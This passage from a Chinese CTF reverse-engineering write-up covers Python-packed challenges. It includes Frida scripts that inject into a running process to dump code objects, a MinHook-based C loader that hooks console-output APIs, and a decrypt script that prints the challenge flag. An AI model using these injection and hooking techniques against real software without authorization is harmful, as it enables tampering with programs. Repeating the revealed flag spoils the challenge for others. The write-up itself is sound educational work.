                var Utf8 = new NativeFunction(pUtf8, "pointer", ["pointer"]);
                var c = Utf8(obj);
                if (!c || c.isNull()) { Clear(); return null; }
                return c.readCString();
            } catch (e) { Clear(); return null; }
        }

        function dumpCodeObject(label, funcObj) {
            if (!funcObj || funcObj.isNull()) {
                log("[" + label + "] object is NULL");
                return;
            }
            log("\n[" + label + "] dumping ...");

            // func -> __code__
            var codeObj = GetAttr(funcObj, Memory.allocUtf8String("__code__"));
            if (!codeObj || codeObj.isNull()) {
                log("[" + label + "] no __code__ (not a function?)");
                Clear();
                // 有可能直接就是 code object
                codeObj = funcObj;
            }

            // co_code
            var coCode = GetAttr(codeObj, Memory.allocUtf8String("co_code"));
            var bCode = coCode ? getBytes(coCode) : null;
            if (bCode) {
                log("[" + label + "] co_code (" + bCode.len + " bytes):");
                log("  " + bCode.hex);
            } else {
                log("[" + label + "] co_code = <unreadable>");
            }
            Clear();

            // co_names
            var coNames = GetAttr(codeObj, Memory.allocUtf8String("co_names"));
            if (coNames && !coNames.isNull() && TupleSize && TupleGet) {
                var n = Number(TupleSize(coNames));
                var names = [];
                for (var i = 0; i < n; i++) {
                    var item = TupleGet(coNames, i);
                    var s = item ? getStr(item) : null;
                    names.push(s);
                }
                log("[" + label + "] co_names (" + n + "): " + JSON.stringify(names));
            }
            Clear();

            // co_varnames / co_localsplusnames
            var varnames = GetAttr(codeObj, Memory.allocUtf8String("co_localsplusnames"));
            if (!varnames || varnames.isNull()) {
                varnames = GetAttr(codeObj, Memory.allocUtf8String("co_varnames"));
            }
            if (varnames && !varnames.isNull() && TupleSize && TupleGet) {
                var n = Number(TupleSize(varnames));
                var vars = [];
                for (var i = 0; i < n; i++) {
                    var item = TupleGet(varnames, i);
                    var s = item ? getStr(item) : null;
                    vars.push(s);
                }
                log("[" + label + "] co_varnames (" + n + "): " + JSON.stringify(vars));
            }
            Clear();

            // co_consts
            var coConsts = GetAttr(codeObj, Memory.allocUtf8String("co_consts"));
            if (coConsts && !coConsts.isNull() && TupleSize && TupleGet) {
                var n = Number(TupleSize(coConsts));
                log("[" + label + "] co_consts (" + n + "):");
                for (var i = 0; i < n; i++) {
                    var item = TupleGet(coConsts, i);
                    if (!item || item.isNull()) { log("  [" + i + "] <null>"); continue; }
                    var b = getBytes(item);
                    if (b && b.len > 0) {
                        log("  [" + i + "] bytes(" + b.len + ") " + b.hex);
                        continue;
                    }
                    Clear();
                    var s = getStr(item);
                    if (s !== null) { log("  [" + i + "] str " + JSON.stringify(s)); continue; }
                    Clear();
                    // 可能是 code object / int / None
                    var nestedCode = GetAttr(item, Memory.allocUtf8String("co_code"));
                    if (nestedCode && !nestedCode.isNull()) {
                        var subName = GetAttr(item, Memory.allocUtf8String("co_name"));
                        var subStr = subName ? getStr(subName) : "?";
                        log("  [" + i + "] <code " + JSON.stringify(subStr) + ">");
                        Clear();
                        continue;
                    }
                    Clear();
                    var pLong = mod.findExportByName("PyLong_AsLongLong");
                    if (pLong) {
                        var Long = new NativeFunction(pLong, "int64", ["pointer"]);
                        var iv = Long(item);
                        if (!(iv === -1n && mod.findExportByName("PyErr_Occurred"))) {
                            log("  [" + i + "] int " + iv);
                            continue;
                        }
                    }
                    Clear();
                    log("  [" + i + "] <other>");
                }
            }
            Clear();

            // marshal.dumps 整个 code object
            if (CallFn && ImportMod) {
                try {
                    Clear();
                    var marshalMod = ImportMod(Memory.allocUtf8String("marshal"));
                    if (marshalMod && !marshalMod.isNull()) {
                        var dumps = GetAttr(marshalMod, Memory.allocUtf8String("dumps"));
                        if (dumps && !dumps.isNull()) {
                            var bytesObj = CallFn(dumps, codeObj,
                                ptr(0), ptr(0), ptr(0), ptr(0));
                            if (bytesObj && !bytesObj.isNull()) {
                                var b = getBytes(bytesObj);
                                if (b) {
                                    log("[" + label + "] marshal.dumps = " +
                                        b.len + " bytes");
                                    send({
                                        type: "code_object",
                                        name: label,
                                        size: b.len
                                    }, b.bytes.buffer);
                                }
                            } else {
                                log("[" + label + "] marshal.dumps returned NULL");
                                Clear();
                            }
                        }
                    }
                } catch (e) {
                    log("[" + label + "] marshal.dumps error: " + e);
                    Clear();
                }
            }
        }

        var gil = GILE();
        try {
            var osModule = ImportAdd(Memory.allocUtf8String("os"));
            if (!osModule || osModule.isNull()) {
                log("[-] os not in sys.modules");
                return;
            }
            var osDict = GetDict(osModule);

            // 读 _fwh_key / _fwh_expected 并解密
            var keyObj = DictGet(osDict, Memory.allocUtf8String("_fwh_key"));
            var expObj = DictGet(osDict, Memory.allocUtf8String("_fwh_expected"));

            if (keyObj && !keyObj.isNull() && expObj && !expObj.isNull()) {
                var keyB = getBytes(keyObj);
                var expB = getBytes(expObj);
                if (keyB && expB) {
                    log("[+] _fwh_key      = bytes(" + keyB.len + ") " + keyB.hex);
                    log("[+] _fwh_expected = bytes(" + expB.len + ") " + expB.hex);
                    var out = new Uint8Array(expB.len);
                    for (var i = 0; i < expB.len; i++) {
                        out[i] = expB.bytes[i] ^ keyB.bytes[i % keyB.len];
                    }
                    gotFlag = true;
                }
            } else {
                log("[-] _fwh_key or _fwh_expected not found");
            }

            // dump _fwh_check / _fwh_main 的 code object
            var checkFn = DictGet(osDict, Memory.allocUtf8String("_fwh_check"));
            var mainFn = DictGet(osDict, Memory.allocUtf8String("_fwh_main"));

            if (checkFn && !checkFn.isNull()) dumpCodeObject("_fwh_check", checkFn);
            else log("[-] _fwh_check not in os.__dict__");

            if (mainFn && !mainFn.isNull()) dumpCodeObject("_fwh_main", mainFn);
            else log("[-] _fwh_main not in os.__dict__");

            // 如果没绑定到 os 模块，尝试从 __main__ 里找
            var mainMod = ImportAdd(Memory.allocUtf8String("__main__"));
            if (mainMod && !mainMod.isNull()) {
                var mainDict = GetDict(mainMod);
                if (mainDict && !mainDict.isNull()) {
                    var c2 = DictGet(mainDict, Memory.allocUtf8String("_fwh_check"));
                    var m2 = DictGet(mainDict, Memory.allocUtf8String("_fwh_main"));
                    if (c2 && !c2.isNull() && !(checkFn && !checkFn.isNull()))
                        dumpCodeObject("_fwh_check@main", c2);
                    if (m2 && !m2.isNull() && !(mainFn && !mainFn.isNull()))
                        dumpCodeObject("_fwh_main@main", m2);
                }
            }
        } catch (e) {
            log("[-] exception under GIL: " + e);
        } finally {
            GILR(gil);
        }
    } catch (e) {
        log("[-] outer error: " + e);
    }
}

setInterval(tryInstall, 200);
```

输出如下：

```txt
> python run.py
[*] wating for frozenwhisper.exe
[+] target pid=7680  python313.dll base=0x7ff8222b0000
[+] script loaded
[*] press Enter to quit
[JS] module base = 0x7ff8222b0000
[JS] [+] _fwh_key      = bytes(6) 31725a19436d
[JS] [+] _fwh_expected = bytes(33) 571e3b7e385d5f41057f315d4b4134462e5d5507362a1c5c422d69777318561a27
[JS]
[_fwh_check] dumping ...
[JS] [_fwh_check] co_code (264 bytes):
[JS]   95005b010000000000000000550035010000000000005b0200000000000000003a7700006101000067011e0055005205000000000000000000000000000000000000530235010000000000006e0153036e025b0900000000000000005b0100000000000000005501350100000000000035010000000000001300482e00006e0358215503050000005b0a000000000000000055035b0100000000000000005b0a000000000000000035010000000000002d060000050000002d0c00005b0c00000000000000005503050000002d0c00002d1400006e024d3000000b002000550253033a480000240021005b06000000000000000007006103000020001f00670166003d031f006601
[JS] [_fwh_check] co_names (7): ["len","_fwh_length","encode","UnicodeEncodeError","range","_fwh_key","_fwh_expected"]
[JS] [_fwh_check] co_varnames (4): ["s","data","diff","i"]
[JS] [_fwh_check] co_consts (4):
[JS]   [0] int -1
[JS]   [1] int 0
[JS]   [2] str "ascii"
[JS]   [3] int 0
[JS] [_fwh_check] marshal.dumps = 609 bytes
[+] saved dumped_code_objects\_fwh_check.pyc (625 bytes) | co_name='_fwh_check', co_code_len=264
[JS]
[_fwh_main] dumping ...
[JS] [_fwh_main] co_code (144 bytes):
[JS]   95001e005b010000000000000000530135010000000000006e005b0700000000000000005b090000000000000000550035010000000000002800000000000000610700005303350100000000000020006700530435010000000000002000670021005b0200000000000000005b0400000000000000003402070061050000200053026e001f004e3766003d031f006601
[JS] [_fwh_main] co_names (5): ["input","EOFError","KeyboardInterrupt","print","_fwh_check"]
[JS] [_fwh_main] co_varnames (1): ["text"]
[JS] [_fwh_main] co_consts (5):
[JS]   [0] int -1
[JS]   [1] str "Input flag: "
[JS]   [2] str ""
[JS]   [3] str "Correct"
[JS]   [4] str "Wrong"
[JS] [_fwh_main] marshal.dumps = 404 bytes
[+] saved dumped_code_objects\_fwh_main.pyc (420 bytes) | co_name='_fwh_main', co_code_len=144
```

![](https://img.halfcity.top/2026/11/10/6ab379d0ed4d8f5fd9bb817139190925.png)

接下来我们就可以拿去反编译了：

![](https://img.halfcity.top/2026/11/10/a01d8b775cced253a86f20117a6f1ca5.png)

![](https://img.halfcity.top/2026/11/10/05d11d35ac5cd10c6eb37cf90e5c92f9.png)

emmm 似乎 pyc 的语法有问题吗？可能是因为没有组织好调用的关系，理论上来说字节码不应该有错的，不然根本无法运行。

好吧既然它帮我们纠错了，我们直接分析即可。

整理一下输出和全局的变量还原的源码大致如下：

```py
_fwh_length   = 33
_fwh_key      = bytes.fromhex("31725a19436d")
_fwh_expected = bytes.fromhex("571e3b7e385d5f41057f315d4b4134462e5d5507362a1c5c422d69777318561a27")

def _fwh_check(s) -> bool:
    if len(s) != _fwh_length:
        return False
    else:
        try:
            data = s.encode('ascii')
        except UnicodeEncodeError:
            return False
        diff = 0
        for i in range(len(data)):
            diff |= data[i] ^ _fwh_key[i % len(_fwh_key)] ^ _fwh_expected[i]
        return diff == 0

def _fwh_main():
    try:
        text = input('Input flag: ')
    except (EOFError, KeyboardInterrupt):
        text = ''
    print('Correct' if _fwh_check(text) else 'Wrong')

os._fwh_main()
```

可以看到加密逻辑异常简单，就是简单的字节流异或加密。

解密脚本如下：

```py
key_hex      = "31725a19436d"
expected_hex = "571e3b7e385d5f41057f315d4b4134462e5d5507362a1c5c422d69777318561a27"

key      = bytes.fromhex(key_hex)
expected = bytes.fromhex(expected_hex)

print(f"[*] key      = {len(key)} bytes: {key.hex()}")
print(f"[*] expected = {len(expected)} bytes: {expected.hex()}")
print()

flag_bytes = bytes(
    expected[i] ^ key[i % len(key)]
    for i in range(len(expected))
)

print(f"[+] flag (hex) = {flag_bytes.hex()}")
print(f"[+] flag (raw) = {flag_bytes.decode('ascii', errors='replace')}")
```

输出如下：

```txt
> python decrypt.py
[*] key      = 6 bytes: 31725a19436d
[*] expected = 33 bytes: 571e3b7e385d5f41057f315d4b4134462e5d5507362a1c5c422d69777318561a27

[+] flag (hex) = 666c61677b306e335f6672307a336e5f6d3064756c335f31735f336e307567687d
[+] flag (raw) = flag{0n3_fr0z3n_m0dul3_1s_3n0ugh}
```

```txt
flag{0n3_fr0z3n_m0dul3_1s_3n0ugh}
```

### 阿萨拉下班指南·四：你管这叫小保险？

#### 静态分析

![](https://img.halfcity.top/2026/11/10/8d5ce684efd740828ea15a3024e65ee6.png)

查壳发现是 nuitka 打包的。

好巧啊，昨天还在想用 nuitka 给工具打包很好，今天美梦就破碎了。

```txt
> nuitka-extractor.exe D:\data\blog\ctf\spark_2026\resources\week4\challenge.exe
[+] Processing D:\data\blog\ctf\spark_2026\resources\week4\challenge.exe
[+] File type: PE
[+] Payload size: 3757344 bytes
[+] Payload compression: true
[+] Beginning extraction...
[+] Total files: 5
[+] Successfully extracted to D:\data\blog\ctf\spark_2026\resources\week4\challenge.exe_extracted
```

反编译后注意到 `challenge.dll` 这个文件，这应该就是我们需要解析的了。

nutika 会复刻原逻辑中 python 运行时的行为，所以这里即使是一个简单的语句翻译为 c 后也十分复杂，几乎和 rust 一样是天然的混淆。

所以我更可行的方案是动态调试找到关键的校验逻辑。

#### 动态分析

刚开始这不是我最后做的一道题，所以最开始我走了一点弯路，直到做到做到上一道题给了我一定的经验回到这一题我才有所突破，即使是 nutika 编译打包后的程序，依旧需要维护一个 python 的 runtime。

里面编译的所有函数都必须符合 python 自己的约束，所以理论上来说检验函数依旧会被注册到为 PyObject 并暴露在全局空间中。

但是这里我并没有看到 python 和 challenge 的 dll 加载到 challenge.exe 中，这里我们可以自己写一个简单的 Loader 将提取出来的 dll 加载到自己的程序里面，然后我们就可以精确地分析程序了。

这里我还是按照我最开始的思路走一遍。

我寄希望于可以用过分析 print 的函数调用栈定位程序，所以我从之前的项目中拿来了编译后的 minhook.x64.lib 并导入到这个项目中，然后 hook 了 `WriteConsoleW` 和 `WriteFile` 这两个 API：

```c
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "MinHook/include/MinHook.h"

#pragma comment(lib, "minhook.x64.lib")

typedef BOOL(WINAPI* PFN_WriteConsoleW)(HANDLE, const void*, DWORD, LPDWORD, LPVOID);
typedef BOOL(WINAPI* PFN_WriteFile)(HANDLE, const void*, DWORD, LPDWORD, LPOVERLAPPED);

static PFN_WriteConsoleW orig_WriteConsoleW = NULL;
static PFN_WriteFile     orig_WriteFile = NULL;

static void PrintStack(void) {
    void* frames[48];
    USHORT n = CaptureStackBackTrace(0, 48, frames, NULL);
    for (int i = 0; i < n; i++) {
        HMODULE hMod = NULL;
        char modName[MAX_PATH] = "?";
        if (GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
            GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
            (LPCSTR)frames[i], &hMod) && hMod) {
            GetModuleFileNameA(hMod, modName, MAX_PATH);
            char* s = strrchr(modName, '\\');
            if (s) memmove(modName, s + 1, strlen(s + 1) + 1);
            printf("    #%02d %p  %s+0x%llx\n", i, frames[i], modName,
                (unsigned long long)((char*)frames[i] - (char*)hMod));
        }
        else {
            printf("    #%02d %p\n", i, frames[i]);
        }
    }
    fflush(stdout);
}

static int LooksInteresting(const char* s, int n) {
    if (n <= 0 || n > 4096) return 0;
    static const char* keys[] = { "Conf", "cargo", "handoff", "safe", "tiny", "support", NULL };
    for (int k = 0; keys[k]; k++) {
        int klen = (int)strlen(keys[k]);
        for (int i = 0; i + klen <= n; i++) {
            if (memcmp(s + i, keys[k], klen) == 0) return 1;
        }
    }
    return 0;
}

static BOOL WINAPI Hook_WriteConsoleW(HANDLE h, const void* buf, DWORD n, LPDWORD written, LPVOID r) {
    if (buf && n > 0 && n < 4096) {
        char narrow[4096] = { 0 };
        const wchar_t* w = (const wchar_t*)buf;
        for (DWORD i = 0; i < n && i < 4095; i++) {
            narrow[i] = (w[i] >= 0x20 && w[i] < 0x7f) ? (char)w[i] : (w[i] == L'\n' ? '\n' : '.');
        }
        if (LooksInteresting(narrow, (int)n)) {
            printf("\n===== [WriteConsoleW] ====\n  \"");
            for (DWORD i = 0; i < n && i < 200; i++) {
                wchar_t c = w[i];
                if (c == L'\n') printf("\\n");
                else if (c == L'\r') printf("\\r");
                else if (c >= 0x20 && c < 0x7f) putchar((char)c);
                else printf("\\x%04x", (unsigned int)c);
            }
            printf("\"\n  Stack:\n");
            PrintStack();
            printf("==========================\n\n");
            fflush(stdout);
        }
    }
    return orig_WriteConsoleW(h, buf, n, written, r);
}

static BOOL WINAPI Hook_WriteFile(HANDLE h, const void* buf, DWORD n, LPDWORD written, LPOVERLAPPED ov) {
    if (buf && n > 0 && n < 4096) {
        char narrow[4096] = { 0 };
        for (DWORD i = 0; i < n && i < 4095; i++) {
            unsigned char c = ((unsigned char*)buf)[i];
            narrow[i] = (c >= 0x20 && c < 0x7f) ? (char)c : (c == '\n' ? '\n' : '.');
        }
        if (LooksInteresting(narrow, (int)n)) {
            printf("\n===== [WriteFile] ====\n  \"");
            for (DWORD i = 0; i < n && i < 200; i++) {
                unsigned char c = ((unsigned char*)buf)[i];
                if (c == '\n') printf("\\n");
                else if (c == '\r') printf("\\r");
                else if (c >= 0x20 && c < 0x7f) putchar(c);
                else printf("\\x%02x", c);
            }
            printf("\"\n  Stack:\n");
            PrintStack();
            printf("======================\n\n");
            fflush(stdout);
        }
    }
    return orig_WriteFile(h, buf, n, written, ov);
}

static HMODULE LoadPython() {
    const char* c[] = { "python314.dll","python313.dll","python312.dll","python311.dll",NULL };
    for (int i = 0; c[i]; i++) {
        HMODULE h = LoadLibraryA(c[i]);
        if (h) { printf("[+] %s @ %p\n", c[i], h); return h; }
    }
    return NULL;
}

int main(int argc, char** argv) {
    
    HMODULE hp = LoadPython();
    if (!hp) return 1;

    if (MH_Initialize() != MH_OK) return 1;

    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    void* pWCW = (void*)GetProcAddress(hK32, "WriteConsoleW");
    void* pWF = (void*)GetProcAddress(hK32, "WriteFile");

    MH_CreateHook(pWCW, &Hook_WriteConsoleW, (LPVOID*)&orig_WriteConsoleW);
    MH_CreateHook(pWF, &Hook_WriteFile, (LPVOID*)&orig_WriteFile);
    MH_EnableHook(pWCW);
    MH_EnableHook(pWF);
    printf("[+] Output hooks installed (filter on keywords)\n\n");

    HMODULE hCh = LoadLibraryA("challenge.dll");
    if (!hCh) { printf("[-] challenge.dll load fail\n"); return 1; }
    printf("[+] challenge.dll @ %p\n", hCh);

    typedef void(__fastcall* PFN_run)(int, const wchar_t**);
    PFN_run rc = (PFN_run)GetProcAddress(hCh, "run_code");
    if (!rc) { printf("[-] run_code not found\n"); return 1; }
    printf("[+] run_code @ %p\n[*] Calling...\n\n", rc);
    fflush(stdout);

    const wchar_t* av[] = { L"challenge.exe", NULL };
    rc(1, av);
    return 0;
}
```

输出如下：

```txt
> loader.exe

[+] python314.dll @ 00007FF83C950000
[+] Output hooks installed (filter on keywords)

[+] challenge.dll @ 00007FFFF5E70000
[+] run_code @ 00007FFFF5E76740
[*] Calling...


===== [WriteConsoleW] ====
  "Confidential cargo handoff: "
  Stack:
    #00 00007FF7FAD110A3  loader.exe+0x10a3
    #01 00007FF7FAD113EC  loader.exe+0x13ec
    #02 00007FFFE24522C4  python312.dll+0x2622c4
    #03 00007FFFE2452097  python312.dll+0x262097
    #04 00007FFFE23E1F70  python312.dll+0x1f1f70
    #05 00007FFFE23026A6  python312.dll+0x1126a6
    #06 00007FFFE224678C  python312.dll+0x5678c
    #07 00007FFFF5E8AB60  challenge.dll+0x1ab60
    #08 00007FFFF5E76058  challenge.dll+0x6058
    #09 00007FFFF5E8A27E  challenge.dll+0x1a27e
    #10 00007FFFF5E7AB07  challenge.dll+0xab07
    #11 00007FFFF5E94C12  challenge.dll+0x24c12
    #12 00007FFFF5E953B9  challenge.dll+0x253b9
    #13 00007FFFF5E9557A  challenge.dll+0x2557a
    #14 00007FFFF5EA16D3  challenge.dll+0x316d3
    #15 00007FFFF5E76749  challenge.dll+0x6749
    #16 00007FF7FAD11893  loader.exe+0x1893
    #17 00007FF7FAD139EF  loader.exe+0x39ef
    #18 00007FF92557DDA7  KERNEL32.DLL+0x2dda7
    #19 00007FF925FBEE4C  ntdll.dll+0x7ee4c
==========================

Confidential cargo handoff: 123

===== [WriteConsoleW] ====
  "Why does this tiny safe need full support?\r\n"
  Stack:
    #00 00007FF7FAD110A3  loader.exe+0x10a3
    #01 00007FF7FAD113EC  loader.exe+0x13ec
    #02 00007FFFE2432901  python312.dll+0x242901
    #03 00007FFFE243275F  python312.dll+0x24275f
    #04 00007FFFE226AD0D  python312.dll+0x7ad0d
    #05 00007FFFE224A7E4  python312.dll+0x5a7e4
    #06 00007FFFE22E9C49  python312.dll+0xf9c49
    #07 00007FFFE22ED348  python312.dll+0xfd348
    #08 00007FFFE22ED256  python312.dll+0xfd256
    #09 00007FFFE22ED1E0  python312.dll+0xfd1e0
    #10 00007FFFE224A726  python312.dll+0x5a726
    #11 00007FFFE224A7E4  python312.dll+0x5a7e4
    #12 00007FFFE23078C7  python312.dll+0x1178c7
    #13 00007FFFE2307465  python312.dll+0x117465
    #14 00007FFFE225EA07  python312.dll+0x6ea07
    #15 00007FFFE222AC76  python312.dll+0x3ac76
    #16 00007FFFE221BDEB  python312.dll+0x2bdeb
    #17 00007FFFE221A9FD  python312.dll+0x2a9fd
    #18 00007FFFE2217FA0  python312.dll+0x27fa0
    #19 00007FFFE22195FA  python312.dll+0x295fa
    #20 00007FFFE2218E42  python312.dll+0x28e42
    #21 00007FFFE220874E  python312.dll+0x1874e
    #22 00007FFFF5E8AB60  challenge.dll+0x1ab60
    #23 00007FFFF5E761BA  challenge.dll+0x61ba
    #24 00007FFFF5E8A27E  challenge.dll+0x1a27e
    #25 00007FFFF5E7AB07  challenge.dll+0xab07
    #26 00007FFFF5E94C12  challenge.dll+0x24c12
    #27 00007FFFF5E953B9  challenge.dll+0x253b9
    #28 00007FFFF5E9557A  challenge.dll+0x2557a
    #29 00007FFFF5EA16D3  challenge.dll+0x316d3
    #30 00007FFFF5E76749  challenge.dll+0x6749
    #31 00007FF7FAD11893  loader.exe+0x1893
    #32 00007FF7FAD139EF  loader.exe+0x39ef
    #33 00007FF92557DDA7  KERNEL32.DLL+0x2dda7
    #34 00007FF925FBEE4C  ntdll.dll+0x7ee4c
==========================

Why does this tiny safe need full support?
```

其实结果很不理想，这里可以两个不同的函数都会返回到看到在 0x161a0 这个 rva ，我们是可以分析定位到 main 的，但是思考一下。

nutika 调用 input 函数是需要通过这个字符串作为索引得到一个 input 函数的实例，随后再最终调用 input。

所以直接通过 input 应该就可以定位到 main。

![](https://img.halfcity.top/2026/11/10/0e7cfacac51949fbfaa46c032442be68.png)

发现确实可以定位到 main，但是我们看一看 main 函数：

![](https://img.halfcity.top/2026/11/10/f60b14bea691fb1a83be5b308b2c99c0.png)

里面有大量的 nutika 调度器的代码，以及 python 原有的 GIL 调度，引用计数等。

在没有辅助的情况下，具体的逻辑几乎无法正常分析。

这时我重新思考了一下，才意识到可以利用 python 运行时的数据可以辅助进行分析。

frida 的服务端脚本如下：

```py
# run.py
# 用法：
#   python run.py                    # 自动找进程名含 loader/dump3/challenge 的进程
#   python run.py --pid 12345        # 指定 PID
#   python run.py --name loader.exe  # 指定进程名

import frida
import time
import os
import sys
import struct
import marshal
import argparse
import dis

# ---------------- 配置 ----------------
DLL = "python312.dll"
JS_PATH = "targeted_dump.js"
OUT_DIR = "dumped_code_objects"

# CPython 3.12 magic number: 0x0DCB (little endian: cb 0d 0d 0a)
PY312_MAGIC = b'\xcb\x0d\x0d\x0a'

# 自动匹配的进程名（小写包含即命中）
DEFAULT_KEYWORDS = ["loader", "challenge"]


# ---------------- pyc 头构造 ----------------
def build_pyc_header(magic=PY312_MAGIC, mtime=0, source_size=0):
    """构造 CPython 3.12 的 pyc 文件头（16 字节）"""
    return (
        magic
        + struct.pack('<I', 0)           # flags（3.7+ 新增，3.12 仍是 0 表示无 hash）
        + struct.pack('<I', mtime)       # mtime
        + struct.pack('<I', source_size) # 源码大小
    )


# ---------------- 消息回调 ----------------
def on_message(msg, data):
    if msg["type"] == "send":
        payload = msg.get("payload", {})

        if payload.get("type") == "code_object":
            name = payload.get("name", "unknown")
            name = name.replace("/", "_").replace("\\", "_").replace("@", "_at_")
            size = int(payload.get("size", 0))
            os.makedirs(OUT_DIR, exist_ok=True)

            marshal_data = bytes(data)
            pyc_path = os.path.join(OUT_DIR, f"{name}.pyc")

            with open(pyc_path, "wb") as f:
                f.write(build_pyc_header())
                f.write(marshal_data)

            print(f"[+] saved {pyc_path} ({size + 16} bytes)")

            # 立即解析，验证内容并打印摘要
            try:
                code = marshal.loads(marshal_data)
                print(f"    co_name      = {code.co_name!r}")
                print(f"    co_code_len  = {len(code.co_code)}")
                print(f"    co_names     = {list(code.co_names)}")
                print(f"    co_varnames  = {list(code.co_varnames)}")
                print(f"    co_consts    =")
                for i, c in enumerate(code.co_consts):
                    if isinstance(c, bytes):
                        print(f"      [{i}] bytes({len(c)}) {c.hex()}")
                    elif isinstance(c, str):
                        print(f"      [{i}] str  {c!r}")
                    elif isinstance(c, int):
                        print(f"      [{i}] int  {c}")
                    elif isinstance(c, type(code)):
                        print(f"      [{i}] <code {c.co_name!r}>")
                    else:
                        print(f"      [{i}] {type(c).__name__} {c!r}")

                # 如果字节码非空，直接 dis 一份
                if len(code.co_code) > 0:
                    print(f"\n--- dis.dis({code.co_name}) ---")
                    try:
                        dis.dis(code)
                    except Exception as e:
                        print(f"    [dis failed: {e}]")
                    print("--- end dis ---\n")
            except Exception as e:
                print(f"    [verify failed: {e}]")

        else:
            m = payload.get("m", "")
            if m:
                print(f"[JS] {m}")

    elif msg["type"] == "error":
        print(f"[ERR] {msg.get('description')}")
        if msg.get("stack"):
            print(msg["stack"])

    elif msg["type"] == "log":
        print(f"[LOG] {msg['payload']}")


# ---------------- 找目标进程 ----------------
def list_candidates(keywords):
    """返回所有匹配进程 [(pid, name), ...]"""
    try:
        device = frida.get_local_device()
    except Exception as e:
        print(f"[-] get_local_device failed: {e}")
        return []
    hits = []
    for p in device.enumerate_processes():
        nm = p.name.lower()
        for kw in keywords:
            if kw.lower() in nm:
                hits.append((p.pid, p.name))
                break
    return hits


def attach_and_check(pid, timeout=15.0):
    """attach 到 pid，检查 python312.dll 是否已加载"""
    try:
        session = frida.attach(pid)
    except Exception as e:
        print(f"[-] attach pid={pid} failed: {e}")
        return None, None

    probe_js = f"""
        var m = Process.findModuleByName("{DLL}");
        send({{found: !!m, base: m ? m.base.toString() : null}});
    """
    result = {"found": False, "base": None}
    def cb(msg, data):
        if msg["type"] == "send":
            result.update(msg["payload"])

    script = session.create_script(probe_js)
    script.on("message", cb)
    try:
        script.load()
        time.sleep(0.3)
    except Exception as e:
        print(f"[-] probe script failed on pid={pid}: {e}")
        session.detach()
        return None, None
    session.detach()

    return bool(result.get("found")), result.get("base")


# ---------------- 主流程 ----------------
def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--pid", type=int, default=None, help="直接指定 PID")
    ap.add_argument("--name", type=str, default=None, help="指定进程名（模糊匹配）")
    ap.add_argument("--keywords", type=str, default=None,
                    help="逗号分隔的匹配关键词，默认 loader,dump3,dump2,dump,challenge")
    ap.add_argument("--dll", type=str, default=None, help=f"Python DLL 名，默认 {DLL}")
    ap.add_argument("--js", type=str, default=None, help=f"JS 脚本路径，默认 {JS_PATH}")
    ap.add_argument("--timeout", type=float, default=120.0, help="等待进程的超时秒数")
    args = ap.parse_args()

    dll_name = args.dll or DLL
    js_path = args.js or JS_PATH

    if not os.path.exists(js_path):
        print(f"[-] JS 脚本不存在: {js_path}")
        return

    keywords = DEFAULT_KEYWORDS
    if args.name:
        keywords = [args.name]
    if args.keywords:
        keywords = [k.strip() for k in args.keywords.split(",") if k.strip()]

    print(f"[*] DLL       = {dll_name}")
    print(f"[*] JS_PATH   = {js_path}")
    print(f"[*] keywords  = {keywords}")

    # 1. 找目标
    pid = None
    base = None

    if args.pid:
        print(f"[*] 使用指定 PID = {args.pid}")
        found, base = attach_and_check(args.pid)
        if found:
            pid = args.pid
        else:
            print(f"[-] PID {args.pid} 已附加但未找到 {dll_name}")
            return
    else:
        print(f"[*] 等待进程出现（最多 {args.timeout:.0f} 秒）...")
        deadline = time.time() + args.timeout
        while time.time() < deadline:
            cands = list_candidates(keywords)
            if cands:
                print(f"[*] 候选进程: {cands}")
                for c_pid, c_name in cands:
                    ok, cb = attach_and_check(c_pid)
                    if ok:
                        pid, base = c_pid, cb
                        print(f"[+] 命中: PID={pid} name={c_name} {dll_name} base={base}")
                        break
                if pid:
                    break
            time.sleep(0.2)

    if pid is None:
        print(f"[-] 未找到可附着的目标进程（含 {dll_name}）")
        return

    # 2. 正式 attach 并注入 dump 脚本
    print(f"[+] attach pid={pid} ...")
    session = frida.attach(pid)

    with open(js_path, encoding="utf-8") as f:
        js = f.read()
    # 如果命令行指定了不同 DLL，做一次替换
    if dll_name != "python312.dll":
        js = js.replace('"python312.dll"', f'"{dll_name}"')

    script = session.create_script(js)
    script.on("message", on_message)
    script.load()
    print("[+] dump 脚本已加载，等待 JS 侧命中 __main__.verify ...")

    # 3. 等待用户回车或 JS 侧完成
    try:
        input("\n[*] 按 Enter 退出（此时可在 loader 控制台输入 123 继续触发 verify）\n")
    except KeyboardInterrupt:
        pass
    finally:
        try:
            session.detach()
        except Exception:
            pass
        print("[*] 已 detach")


if __name__ == "__main__":
    main()
```

frida 脚本如下：

```js
var DLL = "python312.dll";
var done = false;
var initialized = false;

function log(s) { try { send({ m: String(s) }); } catch (e) { } }

// 导出的 C API
var fnIsInit, fnGILE, fnGILR, fnImportAdd, fnImportMod, fnGetModuleDict,
    fnGetDict, fnDictGet, fnDictNext, fnGetAttr, fnObjectType, fnUtf8,
    fnBytes, fnTupleSize, fnTupleGet, fnErrClear, fnCallFn, fnLong, fnRepr;

var PyFunction_Type = null, PyBytes_Type = null, PyUnicode_Type = null,
    PyLong_Type = null, PyTuple_Type = null;

function initFunctions(mod) {
    if (initialized) return true;
    function ex(name) {
        var p = mod.findExportByName(name);
        if (!p) { log("[-] missing export: " + name); return null; }
        return p;
    }
    var aIsInit = ex("Py_IsInitialized");
    var aGILE = ex("PyGILState_Ensure");
    var aGILR = ex("PyGILState_Release");
    var aImportAdd = ex("PyImport_AddModule");
    var aImportMod = ex("PyImport_ImportModule");
    var aGetModuleDict = ex("PyImport_GetModuleDict");
    var aGetDict = ex("PyModule_GetDict");
    var aDictGet = ex("PyDict_GetItemString");
    var aDictNext = ex("PyDict_Next");
    var aGetAttr = ex("PyObject_GetAttrString");
    var aObjectType = ex("PyObject_Type");
    var aUtf8 = ex("PyUnicode_AsUTF8");
    var aBytes = ex("PyBytes_AsStringAndSize");
    var aTupleSize = ex("PyTuple_Size");
    var aTupleGet = ex("PyTuple_GetItem");
    var aErrClear = ex("PyErr_Clear");
    var aCallFn = ex("PyObject_CallFunctionObjArgs");
    var aLong = ex("PyLong_AsLongLong");
    var aRepr = ex("PyObject_Repr");
